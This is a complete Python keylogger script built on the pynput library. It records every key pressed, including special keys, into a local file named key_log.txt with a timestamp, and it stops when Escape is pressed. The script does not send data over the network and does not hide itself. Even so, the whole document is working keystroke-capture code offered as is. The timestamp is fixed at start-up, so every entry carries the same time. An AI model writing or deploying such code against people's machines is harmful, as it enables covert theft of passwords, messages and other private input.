#coding: utf-8 

import datetime
from pynput.keyboard import Key, Listener

def keylogger():
    # Name of the file where key logs will be saved
    filename = "key_log.txt"
    
    # Get the current date and time for logging purposes
    dt = datetime.datetime.now()
    date = str(dt)
    
    def on_press(key):
        try:
            # Open the log file in append mode to record each key press
            file = open(filename, 'a')
        
            # Check if the key has a printable character (e.g., letters, numbers, etc.)
            if hasattr(key, 'char'):
                file.write(date)  # Log the date and time
                file.write(" -> {0} - Pressed\n".format(key))  # Record the key pressed
            else:
                # Handle special keys (e.g., space, enter, tab, etc.) using pattern matching
                match key:
                    case Key.space:
                        file.write(' ')   # Record a space character
                    case Key.enter:
                        file.write('\n')  # Record a new line
                    case Key.tab:
                        file.write('\t')  # Record a tab character
                    case Key.esc:
                        # Stop the listener when the Escape key is pressed
                        return False
                    case _:
                        # For other special keys, log their names
                        file.write(date)
                        file.write(' -> [' + key.name + ']\n')
    
        except FileNotFoundError:
            # Handle the case where the file doesn't exist
            print(f"Error : The file 'key_log.txt was not found")
        
        except FileExistsError:
            # Handle the case where if the file already exist
            print(f"Error : The file 'key_log.txt already exist")
        
        except PermissionError:
            # Handle the case where there are permission issues
            print(f"Error: Permission denied while accessing the file.")
        
        finally:
            # Attempt to close the file safely
            try:
                file.close()

            except Exception as e:
                # Catch any unexpected exception during file closing
                print(f"An error occurred while closing the file: {e}")


    # Use the Listener class from pynput to monitor key presses
    with Listener(on_press=on_press) as listener:
        listener.join()
        
# Main function to start the keylogger
if __name__ == "__main__":
    keylogger()
